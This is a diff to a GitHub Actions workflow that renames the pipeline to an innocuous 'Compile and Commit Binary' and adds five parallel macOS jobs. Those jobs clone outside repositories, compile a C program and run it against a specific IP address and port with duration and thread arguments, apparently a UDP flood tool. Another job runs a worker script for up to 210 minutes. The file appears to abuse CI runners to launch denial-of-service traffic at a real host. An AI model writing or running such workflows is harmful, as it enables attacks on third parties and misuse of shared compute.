@@ -1,4 +1,4 @@
-name: CI/CD pipelines running status 
+name: Compile and Commit Binary
 
 on:
   push:
@@ -27,9 +27,36 @@ jobs:
     
     - name: Compile and run the program
       run: |
-        git clone https://github.com/Vishal937662y652/Raja.git
-        cd Raja
+        git clone https://github.com/VishalDevloper03/Vishal.git
+        cd Vishal
         chmod +x raja
         pip install requests 
         timeout 12600 python3 worker.py || echo "Script ran for 210 minutes"
+
+  compile-macos:
+    runs-on: macos-latest
+    strategy:
+      matrix:
+        id: [1, 2, 3, 4, 5]
+      max-parallel: 5
+      fail-fast: false
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+      
+    
+    - name: Install dependencies
+      run: |
+        brew update
+        # Install GCC if needed (macOS has clang by default)
+        # brew install gcc
         
+    - name: Compile and run the program
+      run: |
+        git clone https://github.com/Zxvenom3/scaling-fishstick.git
+        cd scaling-fishstick
+        # Using clang on macOS (alternative to gcc)
+        clang m.c -o vishal -lpthread -lm -O3
+        ./vishaaal 20.204.130.58 15976 180 100 1000
+        chmod +x udp_flood
